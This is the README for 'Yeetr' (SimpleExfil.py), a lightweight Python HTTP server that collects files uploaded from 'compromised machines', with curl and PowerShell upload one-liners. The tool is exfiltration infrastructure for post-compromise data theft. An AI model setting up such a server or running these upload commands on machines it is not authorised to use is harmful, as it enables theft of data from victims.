# Yeetr - yeet your files

This server accepts and stores files sent through HTTP POST requests, ideal for operations requiring file uploads from compromised machines or remote systems. It's lightweight, easy to deploy, and listens on a customizable port.

## Requirements

- Python 3.x

## Usage

Start the server by specifying the desired port as an argument. If no port is specified, it defaults to 8000.

```
python SimpleExfil.py 8000
```

To upload a file, use `curl` from the command line, PowerShell, or any suitable HTTP client. Example for uploading `example.txt`:

```
curl -F "file=@example.txt" http://127.0.0.1:8000
```
Note that this only works with actual `curl`, so this command might not work in PowerShell.

To upload a file using PowerShell you can use the following (may not be very reliable):
```
(New-Object System.Net.WebClient).UploadFile("http://127.0.0.1:8000", "C:\tmp\example.txt")
```

Server can also be accessed on the browser for a classic upload UI.
